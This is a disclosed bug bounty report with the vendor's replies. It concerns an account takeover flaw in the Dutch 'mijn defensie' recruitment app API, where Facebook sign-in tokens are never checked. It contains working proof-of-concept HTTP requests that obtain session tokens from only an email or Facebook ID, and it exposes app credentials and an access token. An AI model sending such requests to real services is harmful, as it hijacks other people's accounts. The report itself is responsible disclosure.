title: Ability To Takeover any account by Emaill.

profile.name: Maximum
profile.about: Maximum is a full-service agency specialised in employer branding and recruitment advertising.

vulnerability_information:
Hi Team,
I've found that your api ```api.werkenbijdefensie.nl``` for your ```mijn defensie``` Application do not authenticate Facebook users' probably.
Your application doesn't check the Facebook authentication token at all, which makes any attacker able to takeover any account just by using any valid user's email address.

###More Details:
Here's the application request to auth facebook users:
F194928
```http
POST /v1.1/users/sign_up_by_channel HTTP/1.1
X-app-id: uiq3kjqbpes56os7eqxlky3f
X-app-token: 4lb93ExKv7ClEQR6iCUaH8h3n7qSCiNc
Content-Type: application/x-www-form-urlencoded
Content-Length: 513
Host: api.werkenbijdefensie.nl
Connection: Keep-Alive
Accept-Encoding: gzip
User-Agent: okhttp/3.2.0

channel=Facebook
&user[uid]=███
&user[info][email]=███████
&user[info][first_name]=Ahmed&user[info][last_name]=██████
&user[info][name]=Ahmed █████&user[info][birthday]=09/23/1996
&user[credentials]token]=EAAE8cZCItzkcBAAXYQqnQ5YZB1LqFCzTMrQL4xrYOZAAKkuxkcZAa4sAt3TzwVRMlF4wxV30obzbZCqVG8XDm41yyIWv2wCysHa846rNKXQfRYAtZADHiNZAZA0ZBd6U9GnSJYZCg1RCCgVkOS8ywWjEHeuaKTFvgFe6yeTuPwCAZAhZAIhCatZB0dqO3HOK065qDSRWMxROqzFWndwZDZD
&user[credentials][expires]=true
&user[credentials][expires_at]=1502824792036
```
1. ```user[uid]=██████``` is user's facebook id.
check this > https://www.facebook.com/████
2.  ```user[info][email]``` > is my facebook account's email.
3. ```&user[credentials]token]``` The authentication token.
4. the reset information aren't important
-------
Here's a response example:

```http
HTTP/1.1 201 Created
Server: nginx
Date: Fri, 16 Jun 2017 20:28:40 GMT
Content-Type: application/json
Content-Length: 164
Connection: keep-alive
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-XSS-Protection: 1; mode=block
X-Permitted-Cross-Domain-Policies: master-only
Strict-Transport-Security: max-age=31536000;

{"id":"5937d576b5164f04fce31d56","token":"11ef25eb5cdb7e392d502c25ba8f24bfb4e85e55f24208795a49277d0cea2c50","account_status":"confirmed","email_status":"confirmed"}
```
- The token in response is being used to authenticate user while exploring the application as following:  F194927

###POC:
You can preform a request as shown and still get a valid token based on my email or any other valid email on your system.
The request to get token : F194936
The request with token : F194937

```http
POST /v1.1/users/sign_up_by_channel HTTP/1.1
X-app-id: uiq3kjqbpes56os7eqxlky3f
X-app-token: 4lb93ExKv7ClEQR6iCUaH8h3n7qSCiNc
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Host: api.werkenbijdefensie.nl
Connection: Keep-Alive
Accept-Encoding: gzip
User-Agent: okhttp/3.2.0

channel=Facebook&user[uid]={AnyNumbers}&user[info][email]=victim@email.com
```

Let me know if you need more information or a video to explain it more.

Best Regards,
@exr
vulnerability_information_html:
Hi Team,
I've found that your api api.werkenbijdefensie.nl for your mijn defensie Application do not authenticate Facebook users' probably.
Your application doesn't check the Facebook authentication token at all, which makes any attacker able to takeover any account just by using any valid user's email address.

More Details:

Here's the application request to auth facebook users:
Request.png (F194928)

POST /v1.1/users/sign_up_by_channel HTTP/1.1
X-app-id: uiq3kjqbpes56os7eqxlky3f
X-app-token: 4lb93ExKv7ClEQR6iCUaH8h3n7qSCiNc
Content-Type: application/x-www-form-urlencoded
Content-Length: 513
Host: api.werkenbijdefensie.nl
Connection: Keep-Alive
Accept-Encoding: gzip
User-Agent: okhttp/3.2.0

channel=Facebook
&user[uid]=███
&user[info][email]=███████
&user[info][first_name]=Ahmed&user[info][last_name]=██████
&user[info][name]=Ahmed █████&user[info][birthday]=09/23/1996
&user[credentials]token]=EAAE8cZCItzkcBAAXYQqnQ5YZB1LqFCzTMrQL4xrYOZAAKkuxkcZAa4sAt3TzwVRMlF4wxV30obzbZCqVG8XDm41yyIWv2wCysHa846rNKXQfRYAtZADHiNZAZA0ZBd6U9GnSJYZCg1RCCgVkOS8ywWjEHeuaKTFvgFe6yeTuPwCAZAhZAIhCatZB0dqO3HOK065qDSRWMxROqzFWndwZDZD
&user[credentials][expires]=true
&user[credentials][expires_at]=1502824792036
  1. user[uid]=██████ is user's facebook id. check this > https://www.facebook.com/%E2%96%88%E2%96%88%E2%96%88%E2%96%88
  2. user[info][email] > is my facebook account's email.
  3. &user[credentials]token] The authentication token.

4. the reset information aren't important

Here's a response example:

HTTP/1.1 201 Created
Server: nginx
Date: Fri, 16 Jun 2017 20:28:40 GMT
Content-Type: application/json
Content-Length: 164
Connection: keep-alive
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-XSS-Protection: 1; mode=block
X-Permitted-Cross-Domain-Policies: master-only
Strict-Transport-Security: max-age=31536000;

{"id":"5937d576b5164f04fce31d56","token":"11ef25eb5cdb7e392d502c25ba8f24bfb4e85e55f24208795a49277d0cea2c50","account_status":"confirmed","email_status":"confirmed"}
  • The token in response is being used to authenticate user while exploring the application as following: auth_user_request.png (F194927)

POC:

You can preform a request as shown and still get a valid token based on my email or any other valid email on your system.
The request to get token : example1.png (F194936)
The request with token : example11.png (F194937)

POST /v1.1/users/sign_up_by_channel HTTP/1.1
X-app-id: uiq3kjqbpes56os7eqxlky3f
X-app-token: 4lb93ExKv7ClEQR6iCUaH8h3n7qSCiNc
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Host: api.werkenbijdefensie.nl
Connection: Keep-Alive
Accept-Encoding: gzip
User-Agent: okhttp/3.2.0

channel=Facebook&user[uid]={AnyNumbers}&user[info][email]=victim@email.com

Let me know if you need more information or a video to explain it more.

Best Regards,
@exr

activities.message:
You have to change the ```&user[uid]``` after every request because it will be linked to the account every time you make that request and can be used again to get account information without use of email.
Which means that Facebook ID can also be used instead of the email but to do that don't overwrite it with the previous requests :D
Example Request:
```http
POST /v1.1/users/sign_up_by_channel HTTP/1.1
X-app-id: uiq3kjqbpes56os7eqxlky3f
X-app-token: 4lb93ExKv7ClEQR6iCUaH8h3n7qSCiNc
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Host: api.werkenbijdefensie.nl
Connection: Keep-Alive
Accept-Encoding: gzip
User-Agent: okhttp/3.2.0

channel=Facebook&user[uid]={FACEBOOK_ID}
```
You will get a valid token in the response.

You have to change the &user[uid] after every request because it will be linked to the account every time you make that request and can be used again to get account information without use of email.
Which means that Facebook ID can also be used instead of the email but to do that don't overwrite it with the previous requests :D
Example Request:

POST /v1.1/users/sign_up_by_channel HTTP/1.1

You will get a valid token in the response.

activities.message:
Woaw, very well found!
I'm going to think very hard on how to fix this without breaking functionality.
Also, it's late here in the Netherlands (+weekend). Will look more closely to it in the upcoming week
activities.markdown_message:

Also, it's late here in the Netherlands (+weekend). Will look more closely to it in the upcoming week

activities.message:
Sorry for disturbing you then :)

Anyways you can connect it with your website authentication system, it's amazing. 

Have a nice weekend!
activities.markdown_message:
Sorry for disturbing you then :)

Anyways you can connect it with your website authentication system, it's amazing.

Have a nice weekend!

activities.message:
No worries ;)
A fix is ready for deploy. I'll deploy the changes tomorrow as I've got to go in a few minutes.

When it is fixed, nothing but the Facebook token (`user[credentials][token]`) and the channel (Facebook is the only one currently supported) will be taken into account.
Meaning that all the other variables will be dropped and filled based on what Facebook returns.
This should fix the account takeover and yet keep all required information.
Partial account takeover was indeed possible for the accounts not already connected to a Facebook account. Since the functionality of the app is limited, a password reset or email change is (luckily) not possible.

I'll bump this thread tomorrow after I deployed the changes
activities.markdown_message:
No worries ;)
A fix is ready for deploy. I'll deploy the changes tomorrow as I've got to go in a few minutes.

When it is fixed, nothing but the Facebook token (user[credentials][token]) and the channel (Facebook is the only one currently supported) will be taken into account.
Meaning that all the other variables will be dropped and filled based on what Facebook returns.
This should fix the account takeover and yet keep all required information.
Partial account takeover was indeed possible for the accounts not already connected to a Facebook account. Since the functionality of the app is limited, a password reset or email change is (luckily) not possible.

I'll bump this thread tomorrow after I deployed the changes

Can't wait to test it again! :D
Just a small note about what u said  ```Partial account takeover was indeed possible for the accounts not already connected to a Facebook account.``` > I've tested it with two accounts. one connected to facebook and another one not & it was working.
 
Anyways, See you tomorrow ;)

activities.message:
Hey Exr,
Fix is deployed. Can you confirm it's not possible anymore to create an account without an existing facebook token (user[credentials][token]). Also, token is used to send a /me call to the facebook graphQL API. So expired tokens should also be useless.
Do you want me to remove your existing account(s) first?

A query checking for facebook connected accounts without facebook token results in 11 records.
9 for certain yours, determined by name (exr, ahmed).
There are two records of which I'm uncertain if it's you. It's regarding:
1. An account with name: Ibrahim ██████ (last name matches yours though, your brother? :)
2. An account with name (and email): ████████
Are these two yours as well?

activities.message:
Hi @bamie,
This awesome I can confirm it's fixed now. And yeah this my brother's account I found him logged in my laptop so I used it :)
Btw you can remove all these useless accounts because I think this will be my last report to you guys :D
Also I hope you remove my comments on the blog specially this one > https://werkenbijdefensie.nl/blog/van-veld-naar-boekwerk.html

activities.message:
Alright, thanks for confirming! and thanks for reminding me about the blogposts :)

You're one of the best reporters for us so far, so we're very glad with you. If you want you can also check werkenbijdeloitte.nl and werkenbijenexis.nl. We would very much appreciate that! :)

These sites are built on a new CMS system we've built and they haven't been thoroughly tested by externals.
Especially https://werkenbijenexis.nl/update/registreren where you can create and manage an account. This uses the same backend as the accounts on werkenbijdefensie.nl/het-vizier/account.html so a lot of what you reported is also fixed there. Difference is, since werkenbijenexis.nl is a newer site, it's built on top of version 3 of the api (in contrary to version 2 which werkenbijdefensie.nl uses).

In the meantime, I'll assign my colleague to assign bounty :D
activities.markdown_message:
Alright, thanks for confirming! and thanks for reminding me about the blogposts :)

You're one of the best reporters for us so far, so we're very glad with you. If you want you can also check werkenbijdeloitte.nl and werkenbijenexis.nl. We would very much appreciate that! :)

These sites are built on a new CMS system we've built and they haven't been thoroughly tested by externals.
Especially https://werkenbijenexis.nl/update/registreren where you can create and manage an account. This uses the same backend as the accounts on werkenbijdefensie.nl/het-vizier/account.html so a lot of what you reported is also fixed there. Difference is, since werkenbijenexis.nl is a newer site, it's built on top of version 3 of the api (in contrary to version 2 which werkenbijdefensie.nl uses).

In the meantime, I'll assign my colleague to assign bounty :D

Hi @bamie ,
I was wondering what's the API for https://werkenbijenexis.nl/ used for ,So I can test it?
activities.markdown_message:
Hi @bamie ,
I was wondering what's the API for https://werkenbijenexis.nl/ used for ,So I can test it?

activities.message:
Merely for a vacancy counter on enexis.nl (not ours)
The only endpoint is GET https://werkenbijenexis.nl/api/vacancies/count
So nothing much to test on the api ;)
